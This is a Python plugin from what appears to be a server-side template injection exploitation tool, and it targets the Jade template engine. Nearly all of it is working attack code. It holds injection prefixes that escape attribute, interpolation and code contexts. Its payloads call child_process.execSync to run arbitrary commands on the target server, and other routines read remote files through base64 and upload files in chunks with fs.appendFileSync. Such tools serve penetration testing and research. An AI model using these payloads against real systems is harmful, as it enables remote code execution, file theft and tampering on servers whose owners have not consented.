from utils.strings import quote, chunkit, md5
from utils.loggers import log
from utils import rand
from plugins.languages.javascript import Javascript
import base64

class Jade(Javascript):

    render_tag = '\n= %(payload)s\n'
    header_tag = '\n= %(header)s\n'
    trailer_tag = '\n= %(trailer)s\n'
    contexts = [
        # Attribute close a(href=\'%s\')
        { 'level': 1, 'prefix' : '%(closure)s)', 'suffix' : '//', 'closures' : Javascript.code_context_closures },
        # String interpolation ${}
        { 'level': 1, 'prefix' : '%(closure)s}', 'suffix' : '//', 'closures' : Javascript.code_context_closures },
        # Code context -
        { 'level': 1, 'prefix' : '%(closure)s\n', 'suffix' : '//', 'closures' : Javascript.code_context_closures },
    ]

    def detect_engine(self):

        execution_code = """= global.process.mainModule.require('os').platform()"""
        self.set('os', self.inject(execution_code))
        self.set('language', 'javascript')
        self.set('eval', 'javascript')
        self.set('engine', 'jade')

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, command):

        execution_code = """= global.process.mainModule.require('child_process').execSync("%s")""" % quote(command)

        return self.inject(execution_code)

    def detect_read(self):
        self.set('read', True)

    def read(self, remote_path):

        # Get remote file md5
        md5_remote = self._md5(remote_path)

        if not md5_remote:
            log.warn('Error getting remote file md5, check presence and permission')
            return

        # Use base64 since self.execute() calling self.inject() strips
        # the response, corrupting the data
        data_b64encoded = self.inject("""= global.process.mainModule.require('fs').readFileSync('%s').toString('base64')""" % remote_path)

        data = base64.b64decode(data_b64encoded)

        if not md5(data) == md5_remote:
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.info('File downloaded correctly')

        return data

    def _md5(self, remote_path):

        execution_code = """- var x = global.process
- x = x.mainModule.require
= x('crypto').createHash('md5').update(x('fs').readFileSync('%s')).digest("hex")
""" % remote_path

        return self.inject(execution_code)

    def detect_write(self):
        self.set('write', True)

    def write(self, data, remote_path):

        # Check existance and overwrite with --force-overwrite
        if self._md5(remote_path):
            if not self.channel.args.get('force_overwrite'):
                log.warn('Remote path already exists, use --force-overwrite for overwrite')
                return
            else:
                self.inject("""- global.process.mainModule.require('fs').writeFileSync('%s', '')""" % remote_path)

        # Upload file in chunks of 500 characters
        for chunk in chunkit(data, 500):

            chunk_b64 = base64.urlsafe_b64encode(chunk)
            self.inject("""- global.process.mainModule.require('fs').appendFileSync('%s', Buffer('%s', 'base64'), 'binary')""" % (remote_path, chunk_b64))

        if not md5(data) == self._md5(remote_path):
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.warn('File uploaded correctly')
